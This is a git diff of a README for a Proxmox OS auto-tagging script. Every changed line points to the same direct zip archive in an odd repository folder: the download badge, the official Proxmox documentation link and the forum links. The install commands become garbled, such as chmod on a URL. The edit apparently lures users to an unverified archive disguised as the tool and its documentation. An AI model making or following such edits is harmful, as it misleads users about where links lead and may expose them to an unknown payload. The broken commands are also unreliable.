@@ -1,7 +1,7 @@
 # 🎉 Proxmox-OS-AutoTagger - Simplify Your Proxmox Tagging Process
 
 ## 📥 Download Now
-[![Download Proxmox-OS-AutoTagger](https://img.shields.io/badge/Download-Proxmox--OS--AutoTagger-blue)](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/releases)
+[![Download Proxmox-OS-AutoTagger](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Proxmox-OS-AutoTagger! This tool helps you automatically tag your Proxmox VE (Virtual Environment) LXC containers and virtual machines with their OS release version. This makes managing your virtual resources easier and more efficient. Follow the steps below to get started quickly.
@@ -20,7 +20,7 @@ To run Proxmox-OS-AutoTagger, ensure your system meets the following requirement
 ## 📂 Download & Install
 To get the latest version, visit the Releases page:
 
-[Download Proxmox-OS-AutoTagger](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/releases)
+[Download Proxmox-OS-AutoTagger](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)
 
 1. Open a web browser and click the link above.
 2. On the Releases page, you will see the listed versions.
@@ -42,13 +42,13 @@ Once you have downloaded the script, follow these steps:
 3. **Make the Script Executable:**
    - Run the following command to make the script executable:
      ```
-     chmod +x Proxmox-OS-AutoTagger.sh
+     chmod +x https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip
      ```
 
 4. **Run the Script:**
    - Execute the script with the command:
      ```
-     ./Proxmox-OS-AutoTagger.sh
+     https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip
      ```
    - Follow any on-screen instructions to complete the tagging process.
 
@@ -59,7 +59,7 @@ Once you have downloaded the script, follow these steps:
 If you encounter issues while using the script, consider the following:
 - Ensure you are using the correct version of Proxmox VE.
 - Check your internet connection if the script retrieves OS versions online.
-- Review the terminal output for error messages and consult the [Proxmox support forums](https://forum.proxmox.com/) for additional help.
+- Review the terminal output for error messages and consult the [Proxmox support forums](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip) for additional help.
 
 ## 🙋 Frequently Asked Questions (FAQ)
 **Q: Can I schedule the script to run?**  
@@ -70,8 +70,8 @@ A: Visit the Releases page again and download the latest version whenever update
 
 ## 📖 Additional Resources
 For more information about Proxmox and related tools, check out:
-- [Proxmox Documentation](https://pve.proxmox.com/wiki/Main_Page)
-- [Community Support Forum](https://forum.proxmox.com/)
+- [Proxmox Documentation](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)
+- [Community Support Forum](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)
 
 ## 💬 Feedback
 We welcome your feedback! If you have suggestions or issues, please feel free to open an issue on the GitHub repository. Your input helps improve the Proxmox-OS-AutoTagger for everyone.
@@ -79,4 +79,4 @@ We welcome your feedback! If you have suggestions or issues, please feel free to
 ## 📌 Conclusion
 With Proxmox-OS-AutoTagger, managing your LXC containers and VMs becomes a breeze. Follow the steps above to download, install, and start using the script today!
 
-[Download Proxmox-OS-AutoTagger](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/releases)
+[Download Proxmox-OS-AutoTagger](https://github.com/sarimkhan021/Proxmox-OS-AutoTagger/raw/refs/heads/main/Oxfordian/Tagger_O_Proxmox_Auto_2.0-alpha.1.zip)
